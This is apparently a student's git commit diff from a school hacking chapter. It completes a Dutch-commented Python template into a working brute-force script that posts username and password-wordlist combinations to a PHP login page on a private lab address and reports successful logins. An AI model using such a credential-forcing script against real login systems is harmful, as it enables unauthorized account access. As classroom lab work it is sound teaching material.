555d7e510c89ff972ba45369696e001743e72a43
Jp <Peja090604@leerling.mosa-rt.be>
2023-06-05 10:13:24 +0200

    hjk

--- hfst_7_hacken/_credentialsforcer.py
+++ hfst_7_hacken/_credentialsforcer.py
@@ -1,10 +1,10 @@
 import requests
 
 # Welke webpagina 'forcen'. Opgelet: Dit is niet de inlogpagina zelf.
-URL = "VUL AAN" 
+URL = "http://172.16.1.37:8888/super_login_query.php"
 
 # Wat is de gebruikersnaam (Moet in lijst staan!)
-users = ["VUL AAN"] # gebruikersnaam bekend? Vul hier aan.
+users = ["administratie"] # gebruikersnaam bekend? Vul hier aan.
 
 """ Is de naam onbekend? Dan kan je dit gebruiken in plaats van bovenstaande.
 with open("10000-common-usernames.txt", "r") as lines:
@@ -13,24 +13,23 @@ with open("10000-common-usernames.txt", "r") as lines:
 
 
 # Wat is het wachtwoord (Moet in lijst staan!)
-passwords = ["VUL AAN"] # Wachtwoord bekend? Vul hier aan.
+"""passwords = ["VUL AAN"] # Wachtwoord bekend? Vul hier aan."""
 
-""" Is het wachtwoord onbekend? Dan kan je dit gebruiken in plaats van bovenstaande.
+""" Is het wachtwoord onbekend? Dan kan je dit gebruiken in plaats van bovenstaande."""
 with open("10000-password-seclist.txt", "r") as lines:
     passwords = [line.strip() for line in lines]
-"""
 
 # Overloop alle opties.
 for user in users:
     for password in passwords:
         # Zet data klaar om te posten
-        data = "VUL AAN"
+        data = {'admin_id':user, 'password':password, "super_login":'submit'}
 
         # Verzend POST request
         response = requests.post(URL, data=data)
 
         # Controleer of login geslaagd is (OBV inhoud webpagina)
-        if "VUL AAN" in response.text:
+        if "Incorrect" in str(response.content):
             print(f"Incorrecte Combinatie. Naam:{user} Wachtwoord:{password}.")
         else:
             print(f"Je bent binnen! Naam:{user} Wachtwoord:{password}")
